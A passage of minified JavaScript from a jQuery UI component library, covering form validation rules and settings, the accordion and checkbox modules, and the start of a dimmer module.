                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] && (a = c[i], !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(r, n) : void 0 !== a && (s = a), e.isArray(i) ? i.push(s) : void 0 !== i ? i = [i, s] : void 0 !== s && (i = s), a } }, R.initialize() }), void 0 !== i ? i : this }, e.fn.form.settings = { name: "Form", namespace: "form", debug: !1, verbose: !1, performance: !0, fields: !1, keyboardShortcuts: !0, on: "submit", inline: !1, delay: 200, revalidate: !0, transition: "scale", duration: 200, onValid: function() {}, onInvalid: function() {}, onSuccess: function() { return !0 }, onFailure: function() { return !1 }, metadata: { defaultValue: "default", validate: "validate" }, regExp: { htmlID: /^[a-zA-Z][\w:.-]*$/g, bracket: /\[(.*)\]/i, decimal: /^\d+\.?\d*$/, email: /^[a-z0-9!#$%&'*+\/=?^_`{|}~.-]+@[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$/i, escape: /[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, flags: /^\/(.*)\/(.*)?/, integer: /^\-?\d+$/, number: /^\-?\d*(\.\d+)?$/, url: /(https?:\/\/(?:www\.|(?!www))[^\s\.]+\.[^\s]{2,}|www\.[^\s]+\.[^\s]{2,})/i }, text: { unspecifiedRule: "Please enter a valid value", unspecifiedField: "This field" }, prompt: { empty: "{name} must have a value", checked: "{name} must be checked", email: "{name} must be a valid e-mail", url: "{name} must be a valid url", regExp: "{name} is not formatted correctly", integer: "{name} must be an integer", decimal: "{name} must be a decimal number", number: "{name} must be set to a number", is: '{name} must be "{ruleValue}"', isExactly: '{name} must be exactly "{ruleValue}"', not: '{name} cannot be set to "{ruleValue}"', notExactly: '{name} cannot be set to exactly "{ruleValue}"', contain: '{name} must contain "{ruleValue}"', containExactly: '{name} must contain exactly "{ruleValue}"', doesntContain: '{name} cannot contain  "{ruleValue}"', doesntContainExactly: '{name} cannot contain exactly "{ruleValue}"', minLength: "{name} must be at least {ruleValue} characters", length: "{name} must be at least {ruleValue} characters", exactLength: "{name} must be exactly {ruleValue} characters", maxLength: "{name} cannot be longer than {ruleValue} characters", match: "{name} must match {ruleValue} field", different: "{name} must have a different value than {ruleValue} field", creditCard: "{name} must be a valid credit card number", minCount: "{name} must have at least {ruleValue} choices", exactCount: "{name} must have exactly {ruleValue} choices", maxCount: "{name} must have {ruleValue} or less choices" }, selector: { checkbox: 'input[type="checkbox"], input[type="radio"]', clear: ".clear", field: "input, textarea, select", group: ".field", input: "input", message: ".error.message", prompt: ".prompt.label", radio: 'input[type="radio"]', reset: '.reset:not([type="reset"])', submit: '.submit:not([type="submit"])', uiCheckbox: ".ui.checkbox", uiDropdown: ".ui.dropdown" }, className: { error: "error", label: "ui prompt label", pressed: "down", success: "success" }, error: { identifier: "You must specify a string identifier for each field", method: "The method you called is not defined.", noRule: "There is no rule matching the one you specified", oldSyntax: "Starting in 2.0 forms now only take a single settings object. Validation settings converted to new syntax automatically." }, templates: { error: function(t) { var n = '<ul class="list">'; return e.each(t, function(e, t) { n += "<li>" + t + "</li>" }), n += "</ul>", e(n) }, prompt: function(t) { return e("<div/>").addClass("ui basic red pointing prompt label").html(t[0]) } }, rules: { empty: function(t) { return !(void 0 === t || "" === t || e.isArray(t) && 0 === t.length) }, checked: function() { return e(this).filter(":checked").length > 0 }, email: function(t) { return e.fn.form.settings.regExp.email.test(t) }, url: function(t) { return e.fn.form.settings.regExp.url.test(t) }, regExp: function(t, n) { if (n instanceof RegExp) return t.match(n); var i, r = n.match(e.fn.form.settings.regExp.flags); return r && (n = r.length >= 2 ? r[1] : n, i = r.length >= 3 ? r[2] : ""), t.match(new RegExp(n, i)) }, integer: function(t, n) { var i, r, o, a = e.fn.form.settings.regExp.integer; return n && -1 === ["", ".."].indexOf(n) && (-1 == n.indexOf("..") ? a.test(n) && (i = r = n - 0) : (o = n.split("..", 2), a.test(o[0]) && (i = o[0] - 0), a.test(o[1]) && (r = o[1] - 0))), a.test(t) && (void 0 === i || t >= i) && (void 0 === r || t <= r) }, decimal: function(t) { return e.fn.form.settings.regExp.decimal.test(t) }, number: function(t) { return e.fn.form.settings.regExp.number.test(t) }, is: function(e, t) { return t = "string" == typeof t ? t.toLowerCase() : t, (e = "string" == typeof e ? e.toLowerCase() : e) == t }, isExactly: function(e, t) { return e == t }, not: function(e, t) { return e = "string" == typeof e ? e.toLowerCase() : e, t = "string" == typeof t ? t.toLowerCase() : t, e != t }, notExactly: function(e, t) { return e != t }, contains: function(t, n) { return n = n.replace(e.fn.form.settings.regExp.escape, "\\$&"), -1 !== t.search(new RegExp(n, "i")) }, containsExactly: function(t, n) { return n = n.replace(e.fn.form.settings.regExp.escape, "\\$&"), -1 !== t.search(new RegExp(n)) }, doesntContain: function(t, n) { return n = n.replace(e.fn.form.settings.regExp.escape, "\\$&"), -1 === t.search(new RegExp(n, "i")) }, doesntContainExactly: function(t, n) { return n = n.replace(e.fn.form.settings.regExp.escape, "\\$&"), -1 === t.search(new RegExp(n)) }, minLength: function(e, t) { return void 0 !== e && e.length >= t }, length: function(e, t) { return void 0 !== e && e.length >= t }, exactLength: function(e, t) { return void 0 !== e && e.length == t }, maxLength: function(e, t) { return void 0 !== e && e.length <= t }, match: function(t, n) { var i;
                        e(this); return e('[data-validate="' + n + '"]').length > 0 ? i = e('[data-validate="' + n + '"]').val() : e("#" + n).length > 0 ? i = e("#" + n).val() : e('[name="' + n + '"]').length > 0 ? i = e('[name="' + n + '"]').val() : e('[name="' + n + '[]"]').length > 0 && (i = e('[name="' + n + '[]"]')), void 0 !== i && t.toString() == i.toString() }, different: function(t, n) { var i;
                        e(this); return e('[data-validate="' + n + '"]').length > 0 ? i = e('[data-validate="' + n + '"]').val() : e("#" + n).length > 0 ? i = e("#" + n).val() : e('[name="' + n + '"]').length > 0 ? i = e('[name="' + n + '"]').val() : e('[name="' + n + '[]"]').length > 0 && (i = e('[name="' + n + '[]"]')), void 0 !== i && t.toString() !== i.toString() }, creditCard: function(t, n) { var i, r, o = { visa: { pattern: /^4/, length: [16] }, amex: { pattern: /^3[47]/, length: [15] }, mastercard: { pattern: /^5[1-5]/, length: [16] }, discover: { pattern: /^(6011|622(12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[0-1][0-9]|92[0-5]|64[4-9])|65)/, length: [16] }, unionPay: { pattern: /^(62|88)/, length: [16, 17, 18, 19] }, jcb: { pattern: /^35(2[89]|[3-8][0-9])/, length: [16] }, maestro: { pattern: /^(5018|5020|5038|6304|6759|676[1-3])/, length: [12, 13, 14, 15, 16, 17, 18, 19] }, dinersClub: { pattern: /^(30[0-5]|^36)/, length: [14] }, laser: { pattern: /^(6304|670[69]|6771)/, length: [16, 17, 18, 19] }, visaElectron: { pattern: /^(4026|417500|4508|4844|491(3|7))/, length: [16] } },
                            a = {},
                            s = !1,
                            c = "string" == typeof n && n.split(","); if ("string" == typeof t && 0 !== t.length) { if (t = t.replace(/[\-]/g, ""), c && (e.each(c, function(n, i) {
                                    (r = o[i]) && (a = { length: -1 !== e.inArray(t.length, r.length), pattern: -1 !== t.search(r.pattern) }, a.length && a.pattern && (s = !0)) }), !s)) return !1; if (i = { number: -1 !== e.inArray(t.length, o.unionPay.length), pattern: -1 !== t.search(o.unionPay.pattern) }, i.number && i.pattern) return !0; for (var u = t.length, l = 0, d = [
                                    [0, 1, 2, 3, 4, 5, 6, 7, 8, 9],
                                    [0, 2, 4, 6, 8, 1, 3, 5, 7, 9]
                                ], f = 0; u--;) f += d[l][parseInt(t.charAt(u), 10)], l ^= 1; return f % 10 == 0 && f > 0 } }, minCount: function(e, t) { return 0 == t || (1 == t ? "" !== e : e.split(",").length >= t) }, exactCount: function(e, t) { return 0 == t ? "" === e : 1 == t ? "" !== e && -1 === e.search(",") : e.split(",").length == t }, maxCount: function(e, t) { return 0 != t && (1 == t ? -1 === e.search(",") : e.split(",").length <= t) } } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.accordion = function(n) { var i, r = e(this),
                    o = (new Date).getTime(),
                    a = [],
                    s = arguments[0],
                    c = "string" == typeof s,
                    u = [].slice.call(arguments, 1);
                t.requestAnimationFrame || t.mozRequestAnimationFrame || t.webkitRequestAnimationFrame || t.msRequestAnimationFrame; return r.each(function() { var l, d, f = e.isPlainObject(n) ? e.extend(!0, {}, e.fn.accordion.settings, n) : e.extend({}, e.fn.accordion.settings),
                        h = f.className,
                        p = f.namespace,
                        b = f.selector,
                        m = f.error,
                        g = "." + p,
                        v = "module-" + p,
                        y = r.selector || "",
                        w = e(this),
                        x = w.find(b.title),
                        S = w.find(b.content),
                        _ = this,
                        k = w.data(v);
                    d = { initialize: function() { d.debug("Initializing", w), d.bind.events(), f.observeChanges && d.observeChanges(), d.instantiate() }, instantiate: function() { k = d, w.data(v, d) }, destroy: function() { d.debug("Destroying previous instance", w), w.off(g).removeData(v) }, refresh: function() { x = w.find(b.title), S = w.find(b.content) }, observeChanges: function() { "MutationObserver" in t && (l = new MutationObserver(function(e) { d.debug("DOM tree modified, updating selector cache"), d.refresh() }), l.observe(_, { childList: !0, subtree: !0 }), d.debug("Setting up mutation observer", l)) }, bind: { events: function() { d.debug("Binding delegated events"), w.on(f.on + g, b.trigger, d.event.click) } }, event: { click: function() { d.toggle.call(this) } }, toggle: function(t) { var n = void 0 !== t ? "number" == typeof t ? x.eq(t) : e(t).closest(b.title) : e(this).closest(b.title),
                                i = n.next(S),
                                r = i.hasClass(h.animating),
                                o = i.hasClass(h.active),
                                a = o && !r,
                                s = !o && r;
                            d.debug("Toggling visibility of content", n), a || s ? f.collapsible ? d.close.call(n) : d.debug("Cannot close accordion content collapsing is disabled") : d.open.call(n) }, open: function(t) { var n = void 0 !== t ? "number" == typeof t ? x.eq(t) : e(t).closest(b.title) : e(this).closest(b.title),
                                i = n.next(S),
                                r = i.hasClass(h.animating); if (i.hasClass(h.active) || r) return void d.debug("Accordion already open, skipping", i);
                            d.debug("Opening accordion content", n), f.onOpening.call(i), f.exclusive && d.closeOthers.call(n), n.addClass(h.active), i.stop(!0, !0).addClass(h.animating), f.animateChildren && (void 0 !== e.fn.transition && w.transition("is supported") ? i.children().transition({ animation: "fade in", queue: !1, useFailSafe: !0, debug: f.debug, verbose: f.verbose, duration: f.duration }) : i.children().stop(!0, !0).animate({ opacity: 1 }, f.duration, d.resetOpacity)), i.slideDown(f.duration, f.easing, function() { i.removeClass(h.animating).addClass(h.active), d.reset.display.call(this), f.onOpen.call(this), f.onChange.call(this) }) }, close: function(t) { var n = void 0 !== t ? "number" == typeof t ? x.eq(t) : e(t).closest(b.title) : e(this).closest(b.title),
                                i = n.next(S),
                                r = i.hasClass(h.animating),
                                o = i.hasClass(h.active),
                                a = !o && r,
                                s = o && r;!o && !a || s || (d.debug("Closing accordion content", i), f.onClosing.call(i), n.removeClass(h.active), i.stop(!0, !0).addClass(h.animating), f.animateChildren && (void 0 !== e.fn.transition && w.transition("is supported") ? i.children().transition({ animation: "fade out", queue: !1, useFailSafe: !0, debug: f.debug, verbose: f.verbose, duration: f.duration }) : i.children().stop(!0, !0).animate({ opacity: 0 }, f.duration, d.resetOpacity)), i.slideUp(f.duration, f.easing, function() { i.removeClass(h.animating).removeClass(h.active), d.reset.display.call(this), f.onClose.call(this), f.onChange.call(this) })) }, closeOthers: function(t) { var n, i, r, o = void 0 !== t ? x.eq(t) : e(this).closest(b.title),
                                a = o.parents(b.content).prev(b.title),
                                s = o.closest(b.accordion),
                                c = b.title + "." + h.active + ":visible",
                                u = b.content + "." + h.active + ":visible";
                            f.closeNested ? (n = s.find(c).not(a), r = n.next(S)) : (n = s.find(c).not(a), i = s.find(u).find(c).not(a), n = n.not(i), r = n.next(S)), n.length > 0 && (d.debug("Exclusive enabled, closing other content", n), n.removeClass(h.active), r.removeClass(h.animating).stop(!0, !0), f.animateChildren && (void 0 !== e.fn.transition && w.transition("is supported") ? r.children().transition({ animation: "fade out", useFailSafe: !0, debug: f.debug, verbose: f.verbose, duration: f.duration }) : r.children().stop(!0, !0).animate({ opacity: 0 }, f.duration, d.resetOpacity)), r.slideUp(f.duration, f.easing, function() { e(this).removeClass(h.active), d.reset.display.call(this) })) }, reset: { display: function() { d.verbose("Removing inline display from element", this), e(this).css("display", ""), "" === e(this).attr("style") && e(this).attr("style", "").removeAttr("style") }, opacity: function() { d.verbose("Removing inline opacity from element", this), e(this).css("opacity", ""), "" === e(this).attr("style") && e(this).attr("style", "").removeAttr("style") } }, setting: function(t, n) { if (d.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, f, t);
                            else { if (void 0 === n) return f[t];
                                e.isPlainObject(f[t]) ? e.extend(!0, f[t], n) : f[t] = n } }, internal: function(t, n) { if (d.debug("Changing internal", t, n), void 0 === n) return d[t];
                            e.isPlainObject(t) ? e.extend(!0, d, t) : d[t] = n }, debug: function() {!f.silent && f.debug && (f.performance ? d.performance.log(arguments) : (d.debug = Function.prototype.bind.call(console.info, console, f.name + ":"), d.debug.apply(console, arguments))) }, verbose: function() {!f.silent && f.verbose && f.debug && (f.performance ? d.performance.log(arguments) : (d.verbose = Function.prototype.bind.call(console.info, console, f.name + ":"), d.verbose.apply(console, arguments))) }, error: function() { f.silent || (d.error = Function.prototype.bind.call(console.error, console, f.name + ":"), d.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                f.performance && (t = (new Date).getTime(), i = o || t, n = t - i, o = t, a.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: _, "Execution Time": n })), clearTimeout(d.performance.timer), d.performance.timer = setTimeout(d.performance.display, 500) }, display: function() { var t = f.name + ":",
                                    n = 0;
                                o = !1, clearTimeout(d.performance.timer), e.each(a, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", y && (t += " '" + y + "'"), (void 0 !== console.group || void 0 !== console.table) && a.length > 0 && (console.groupCollapsed(t), console.table ? console.table(a) : e.each(a, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), a = [] } }, invoke: function(t, n, r) { var o, a, s, c = k; return n = n || u, r = _ || r, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] ? (a = c[i], !1) : (d.error(m.method, t), !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(r, n) : void 0 !== a && (s = a), e.isArray(i) ? i.push(s) : void 0 !== i ? i = [i, s] : void 0 !== s && (i = s), a } }, c ? (void 0 === k && d.initialize(), d.invoke(s)) : (void 0 !== k && k.invoke("destroy"), d.initialize()) }), void 0 !== i ? i : this }, e.fn.accordion.settings = { name: "Accordion", namespace: "accordion", silent: !1, debug: !1, verbose: !1, performance: !0, on: "click", observeChanges: !0, exclusive: !0, collapsible: !0, closeNested: !1, animateChildren: !0, duration: 350, easing: "easeOutQuad", onOpening: function() {}, onOpen: function() {}, onClosing: function() {}, onClose: function() {}, onChange: function() {}, error: { method: "The method you called is not defined" }, className: { active: "active", animating: "animating" }, selector: { accordion: ".accordion", title: ".title", trigger: ".title", content: ".content" } }, e.extend(e.easing, { easeOutQuad: function(e, t, n, i, r) { return -i * (t /= r) * (t - 2) + n } }) }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.checkbox = function(i) { var r, o = e(this),
                    a = o.selector || "",
                    s = (new Date).getTime(),
                    c = [],
                    u = arguments[0],
                    l = "string" == typeof u,
                    d = [].slice.call(arguments, 1); return o.each(function() { var o, f, h = e.extend(!0, {}, e.fn.checkbox.settings, i),
                        p = h.className,
                        b = h.namespace,
                        m = h.selector,
                        g = h.error,
                        v = "." + b,
                        y = "module-" + b,
                        w = e(this),
                        x = e(this).children(m.label),
                        S = e(this).children(m.input),
                        _ = S[0],
                        k = !1,
                        C = !1,
                        A = w.data(y),
                        E = this;
                    f = { initialize: function() { f.verbose("Initializing checkbox", h), f.create.label(), f.bind.events(), f.set.tabbable(), f.hide.input(), f.observeChanges(), f.instantiate(), f.setup() }, instantiate: function() { f.verbose("Storing instance of module", f), A = f, w.data(y, f) }, destroy: function() { f.verbose("Destroying module"), f.unbind.events(), f.show.input(), w.removeData(y) }, fix: { reference: function() { w.is(m.input) && (f.debug("Behavior called on <input> adjusting invoked element"), w = w.closest(m.checkbox), f.refresh()) } }, setup: function() { f.set.initialLoad(), f.is.indeterminate() ? (f.debug("Initial value is indeterminate"), f.indeterminate()) : f.is.checked() ? (f.debug("Initial value is checked"), f.check()) : (f.debug("Initial value is unchecked"), f.uncheck()), f.remove.initialLoad() }, refresh: function() { x = w.children(m.label), S = w.children(m.input), _ = S[0] }, hide: { input: function() { f.verbose("Modifying <input> z-index to be unselectable"), S.addClass(p.hidden) } }, show: { input: function() { f.verbose("Modifying <input> z-index to be selectable"), S.removeClass(p.hidden) } }, observeChanges: function() { "MutationObserver" in t && (o = new MutationObserver(function(e) { f.debug("DOM tree modified, updating selector cache"), f.refresh() }), o.observe(E, { childList: !0, subtree: !0 }), f.debug("Setting up mutation observer", o)) }, attachEvents: function(t, n) { var i = e(t);
                            n = e.isFunction(f[n]) ? f[n] : f.toggle, i.length > 0 ? (f.debug("Attaching checkbox events to element", t, n), i.on("click" + v, n)) : f.error(g.notFound) }, event: { click: function(t) { var n = e(t.target); return n.is(m.input) ? void f.verbose("Using default check action on initialized checkbox") : n.is(m.link) ? void f.debug("Clicking link inside checkbox, skipping toggle") : (f.toggle(), S.focus(), void t.preventDefault()) }, keydown: function(e) { var t = e.which,
                                    n = { enter: 13, space: 32, escape: 27 };
                                t == n.escape ? (f.verbose("Escape key pressed blurring field"), S.blur(), C = !0) : e.ctrlKey || t != n.space && t != n.enter ? C = !1 : (f.verbose("Enter/space key pressed, toggling checkbox"), f.toggle(), C = !0) }, keyup: function(e) { C && e.preventDefault() } }, check: function() { f.should.allowCheck() && (f.debug("Checking checkbox", S), f.set.checked(), f.should.ignoreCallbacks() || (h.onChecked.call(_), h.onChange.call(_))) }, uncheck: function() { f.should.allowUncheck() && (f.debug("Unchecking checkbox"), f.set.unchecked(), f.should.ignoreCallbacks() || (h.onUnchecked.call(_), h.onChange.call(_))) }, indeterminate: function() { if (f.should.allowIndeterminate()) return void f.debug("Checkbox is already indeterminate");
                            f.debug("Making checkbox indeterminate"), f.set.indeterminate(), f.should.ignoreCallbacks() || (h.onIndeterminate.call(_), h.onChange.call(_)) }, determinate: function() { if (f.should.allowDeterminate()) return void f.debug("Checkbox is already determinate");
                            f.debug("Making checkbox determinate"), f.set.determinate(), f.should.ignoreCallbacks() || (h.onDeterminate.call(_), h.onChange.call(_)) }, enable: function() { if (f.is.enabled()) return void f.debug("Checkbox is already enabled");
                            f.debug("Enabling checkbox"), f.set.enabled(), h.onEnable.call(_), h.onEnabled.call(_) }, disable: function() { if (f.is.disabled()) return void f.debug("Checkbox is already disabled");
                            f.debug("Disabling checkbox"), f.set.disabled(), h.onDisable.call(_), h.onDisabled.call(_) }, get: { radios: function() { var t = f.get.name(); return e('input[name="' + t + '"]').closest(m.checkbox) }, otherRadios: function() { return f.get.radios().not(w) }, name: function() { return S.attr("name") } }, is: { initialLoad: function() { return k }, radio: function() { return S.hasClass(p.radio) || "radio" == S.attr("type") }, indeterminate: function() { return void 0 !== S.prop("indeterminate") && S.prop("indeterminate") }, checked: function() { return void 0 !== S.prop("checked") && S.prop("checked") }, disabled: function() { return void 0 !== S.prop("disabled") && S.prop("disabled") }, enabled: function() { return !f.is.disabled() }, determinate: function() { return !f.is.indeterminate() }, unchecked: function() { return !f.is.checked() } }, should: { allowCheck: function() { return f.is.determinate() && f.is.checked() && !f.should.forceCallbacks() ? (f.debug("Should not allow check, checkbox is already checked"), !1) : !1 !== h.beforeChecked.apply(_) || (f.debug("Should not allow check, beforeChecked cancelled"), !1) }, allowUncheck: function() { return f.is.determinate() && f.is.unchecked() && !f.should.forceCallbacks() ? (f.debug("Should not allow uncheck, checkbox is already unchecked"), !1) : !1 !== h.beforeUnchecked.apply(_) || (f.debug("Should not allow uncheck, beforeUnchecked cancelled"), !1) }, allowIndeterminate: function() { return f.is.indeterminate() && !f.should.forceCallbacks() ? (f.debug("Should not allow indeterminate, checkbox is already indeterminate"), !1) : !1 !== h.beforeIndeterminate.apply(_) || (f.debug("Should not allow indeterminate, beforeIndeterminate cancelled"), !1) }, allowDeterminate: function() { return f.is.determinate() && !f.should.forceCallbacks() ? (f.debug("Should not allow determinate, checkbox is already determinate"), !1) : !1 !== h.beforeDeterminate.apply(_) || (f.debug("Should not allow determinate, beforeDeterminate cancelled"), !1) }, forceCallbacks: function() { return f.is.initialLoad() && h.fireOnInit }, ignoreCallbacks: function() { return k && !h.fireOnInit } }, can: { change: function() { return !(w.hasClass(p.disabled) || w.hasClass(p.readOnly) || S.prop("disabled") || S.prop("readonly")) }, uncheck: function() { return "boolean" == typeof h.uncheckable ? h.uncheckable : !f.is.radio() } }, set: { initialLoad: function() { k = !0 }, checked: function() { if (f.verbose("Setting class to checked"), w.removeClass(p.indeterminate).addClass(p.checked), f.is.radio() && f.uncheckOthers(), !f.is.indeterminate() && f.is.checked()) return void f.debug("Input is already checked, skipping input property change");
                                f.verbose("Setting state to checked", _), S.prop("indeterminate", !1).prop("checked", !0), f.trigger.change() }, unchecked: function() { if (f.verbose("Removing checked class"), w.removeClass(p.indeterminate).removeClass(p.checked), !f.is.indeterminate() && f.is.unchecked()) return void f.debug("Input is already unchecked");
                                f.debug("Setting state to unchecked"), S.prop("indeterminate", !1).prop("checked", !1), f.trigger.change() }, indeterminate: function() { if (f.verbose("Setting class to indeterminate"), w.addClass(p.indeterminate), f.is.indeterminate()) return void f.debug("Input is already indeterminate, skipping input property change");
                                f.debug("Setting state to indeterminate"), S.prop("indeterminate", !0), f.trigger.change() }, determinate: function() { if (f.verbose("Removing indeterminate class"), w.removeClass(p.indeterminate), f.is.determinate()) return void f.debug("Input is already determinate, skipping input property change");
                                f.debug("Setting state to determinate"), S.prop("indeterminate", !1) }, disabled: function() { if (f.verbose("Setting class to disabled"), w.addClass(p.disabled), f.is.disabled()) return void f.debug("Input is already disabled, skipping input property change");
                                f.debug("Setting state to disabled"), S.prop("disabled", "disabled"), f.trigger.change() }, enabled: function() { if (f.verbose("Removing disabled class"), w.removeClass(p.disabled), f.is.enabled()) return void f.debug("Input is already enabled, skipping input property change");
                                f.debug("Setting state to enabled"), S.prop("disabled", !1), f.trigger.change() }, tabbable: function() { f.verbose("Adding tabindex to checkbox"), void 0 === S.attr("tabindex") && S.attr("tabindex", 0) } }, remove: { initialLoad: function() { k = !1 } }, trigger: { change: function() { var e = n.createEvent("HTMLEvents"),
                                    t = S[0];
                                t && (f.verbose("Triggering native change event"), e.initEvent("change", !0, !1), t.dispatchEvent(e)) } }, create: { label: function() { S.prevAll(m.label).length > 0 ? (S.prev(m.label).detach().insertAfter(S), f.debug("Moving existing label", x)) : f.has.label() || (x = e("<label>").insertAfter(S), f.debug("Creating label", x)) } }, has: { label: function() { return x.length > 0 } }, bind: { events: function() { f.verbose("Attaching checkbox events"), w.on("click" + v, f.event.click).on("keydown" + v, m.input, f.event.keydown).on("keyup" + v, m.input, f.event.keyup) } }, unbind: { events: function() { f.debug("Removing events"), w.off(v) } }, uncheckOthers: function() { var e = f.get.otherRadios();
                            f.debug("Unchecking other radios", e), e.removeClass(p.checked) }, toggle: function() { if (!f.can.change()) return void(f.is.radio() || f.debug("Checkbox is read-only or disabled, ignoring toggle"));
                            f.is.indeterminate() || f.is.unchecked() ? (f.debug("Currently unchecked"), f.check()) : f.is.checked() && f.can.uncheck() && (f.debug("Currently checked"), f.uncheck()) }, setting: function(t, n) { if (f.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, h, t);
                            else { if (void 0 === n) return h[t];
                                e.isPlainObject(h[t]) ? e.extend(!0, h[t], n) : h[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, f, t);
                            else { if (void 0 === n) return f[t];
                                f[t] = n } }, debug: function() {!h.silent && h.debug && (h.performance ? f.performance.log(arguments) : (f.debug = Function.prototype.bind.call(console.info, console, h.name + ":"), f.debug.apply(console, arguments))) }, verbose: function() {!h.silent && h.verbose && h.debug && (h.performance ? f.performance.log(arguments) : (f.verbose = Function.prototype.bind.call(console.info, console, h.name + ":"), f.verbose.apply(console, arguments))) }, error: function() { h.silent || (f.error = Function.prototype.bind.call(console.error, console, h.name + ":"), f.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                h.performance && (t = (new Date).getTime(), i = s || t, n = t - i, s = t, c.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: E, "Execution Time": n })), clearTimeout(f.performance.timer), f.performance.timer = setTimeout(f.performance.display, 500) }, display: function() { var t = h.name + ":",
                                    n = 0;
                                s = !1, clearTimeout(f.performance.timer), e.each(c, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", a && (t += " '" + a + "'"), (void 0 !== console.group || void 0 !== console.table) && c.length > 0 && (console.groupCollapsed(t), console.table ? console.table(c) : e.each(c, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), c = [] } }, invoke: function(t, n, i) { var o, a, s, c = A; return n = n || d, i = E || i, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] ? (a = c[i], !1) : (f.error(g.method, t), !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(i, n) : void 0 !== a && (s = a), e.isArray(r) ? r.push(s) : void 0 !== r ? r = [r, s] : void 0 !== s && (r = s), a } }, l ? (void 0 === A && f.initialize(), f.invoke(u)) : (void 0 !== A && A.invoke("destroy"), f.initialize()) }), void 0 !== r ? r : this }, e.fn.checkbox.settings = { name: "Checkbox", namespace: "checkbox", silent: !1, debug: !1, verbose: !0, performance: !0, uncheckable: "auto", fireOnInit: !1, onChange: function() {}, beforeChecked: function() {}, beforeUnchecked: function() {}, beforeDeterminate: function() {}, beforeIndeterminate: function() {}, onChecked: function() {}, onUnchecked: function() {}, onDeterminate: function() {}, onIndeterminate: function() {}, onEnable: function() {}, onDisable: function() {}, onEnabled: function() {}, onDisabled: function() {}, className: { checked: "checked", indeterminate: "indeterminate", disabled: "disabled", hidden: "hidden", radio: "radio", readOnly: "read-only" }, error: { method: "The method you called is not defined" }, selector: { checkbox: ".ui.checkbox", label: "label, .box", input: 'input[type="checkbox"], input[type="radio"]', link: "a[href]" } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.dimmer = function(t) { var i, r = e(this),
                    o = (new Date).getTime(),
                    a = [],
                    s = arguments[0],
                    c = "string" == typeof s,
                    u = [].slice.call(arguments, 1); return r.each(function() { var l, d, f, h = e.isPlainObject(t) ? e.extend(!0, {}, e.fn.dimmer.settings, t) : e.extend({}, e.fn.dimmer.settings),
                        p = h.selector,
                        b = h.namespace,
                        m = h.className,
                        g = h.error,
                        v = "." + b,
                        y = "module-" + b,
                        w = r.selector || "",
                        x = "ontouchstart" in n.documentElement ? "touchstart" : "click",
                        S = e(this),
                        _ = this,
                        k = S.data(y);
                    f = { preinitialize: function() { f.is.dimmer() ? (d = S.parent(), l = S) : (d = S, l = f.has.dimmer() ? h.dimmerName ? d.find(p.dimmer).filter("." + h.dimmerName) : d.find(p.dimmer) : f.create(), f.set.variation()) }, initialize: function() { f.debug("Initializing dimmer", h), f.bind.events(), f.set.dimmable(), f.instantiate() }, instantiate: function() { f.verbose("Storing instance of module", f), k = f, S.data(y, k) }, destroy: function() { f.verbose("Destroying previous module", l), f.unbind.events(), f.remove.variation(), d.off(v) }, bind: { events: function() { "hover" == h.on ? d.on("mouseenter" + v, f.show).on("mouseleave" + v, f.hide) : "click" == h.on && d.on(x + v, f.toggle), f.is.page() && (f.debug("Setting as a page dimmer", d), f.set.pageDimmer()), f.is.closable() && (f.verbose("Adding dimmer close event", l), d.on(x + v, p.dimmer, f.event.click)) } }, unbind: { events: function() { S.removeData(y), d.off(v) } }, event: { click: function(t) { f.verbose("Determining if event occured on dimmer", t), (0 === l.find(t.target).length || e(t.target).is(p.content)) && (f.hide(), t.stopImmediatePropagation()) } }, addContent: function(t) { var n = e(t);
